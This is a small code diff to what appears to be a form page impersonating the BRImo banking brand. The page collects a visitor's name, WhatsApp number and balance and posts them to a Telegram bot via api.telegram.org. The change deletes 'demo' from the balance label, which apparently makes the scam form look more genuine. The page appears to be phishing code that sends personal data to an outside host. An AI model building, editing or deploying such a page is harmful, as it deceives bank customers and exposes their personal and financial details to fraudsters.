@@ -392,7 +392,7 @@
             status.textContent = 'Sedang memproses data...';
             status.className = 'text-center text-xs font-medium text-sky-600 mt-3';
 
-            const pesan = `🔔 NOTIFIKASI FORM BRImo\n\nNama: ${namaVal}\nWhatsApp: ${waVal}\nSaldo demo: Rp ${saldoInput.value}`;
+            const pesan = `🔔 NOTIFIKASI FORM BRImo\n\nNama: ${namaVal}\nWhatsApp: ${waVal}\nSaldo : Rp ${saldoInput.value}`;
 
             try {
                 const hasil = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
